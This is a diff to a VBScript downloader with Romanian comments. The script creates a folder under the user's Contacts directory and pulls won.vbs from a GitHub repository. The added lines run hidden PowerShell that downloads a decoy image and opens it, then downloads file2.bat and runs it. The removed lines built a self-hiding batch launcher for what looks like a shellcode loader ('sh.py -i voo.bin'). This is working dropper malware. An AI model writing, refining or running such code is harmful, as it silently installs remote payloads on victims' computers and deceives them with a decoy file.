@@ -1,10 +1,9 @@
-Dim shell, fso, appDataPath, targetFolder, batContent, xmlHttp
+Dim shell, fso, appDataPath, targetFolder, xmlHttp
 
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' Obține calea către directorul APPDATA
-appDataPath = shell.ExpandEnvironmentStrings("%APPDATA%")
+' Obține calea către directorul țintă
 targetFolder = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Contacts\zo"
 
 ' Asigură-te că directorul țintă există
@@ -14,7 +13,7 @@ End If
 
 ' Descarcă fișierul won.vbs de pe GitHub
 Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-xmlHttp.Open "GET", "https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/file.vbs", False
+xmlHttp.Open "GET", "https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/won.vbs", False
 xmlHttp.Send
 
 If xmlHttp.Status = 200 Then
@@ -28,28 +27,5 @@ If xmlHttp.Status = 200 Then
     stream.Close
 End If
 
-' Creează fișierul a.txt (gol)
-fso.CreateTextFile(targetFolder & "\a.txt").Close
-
-' Creează fișierul b.txt (gol) 
-fso.CreateTextFile(targetFolder & "\b.txt").Close
-
-' Conținutul pentru start.bat
-batContent = "@echo off" & vbCrLf & _
-             "if not ""%~1""==""h"" (" & vbCrLf & _
-             "    powershell -windowstyle hidden -command ""Start-Process '%~f0' -ArgumentList 'h' -WindowStyle Hidden""" & vbCrLf & _
-             "    exit /b" & vbCrLf & _
-             ")" & vbCrLf & _
-             "set ""target=%USERPROFILE%\Contacts\zo""" & vbCrLf & _
-             "" & vbCrLf & _
-             "cd /d ""%target%""" & vbCrLf & _
-             "python.exe sh.py -i voo.bin -k x.txt"
-
-' Creează fișierul start.bat
-Dim batFile
-Set batFile = fso.CreateTextFile(targetFolder & "\start.bat")
-batFile.Write batContent
-batFile.Close
-
-' Execută fișierul start.bat (opțional)
-' shell.Run "cmd /c """ & targetFolder & "\start.bat""", 0, False
+' Rulează comanda PowerShell pentru imagine și alte fișiere
+shell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/image.png' -OutFile $env:TEMP\image.png; Start-Process $env:TEMP\image.png; Start-Sleep -Seconds 2; Invoke-WebRequest 'https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/file2.bat' -OutFile $env:TEMP\file2.bat; Start-Process $env:TEMP\file2.bat""", 0, False
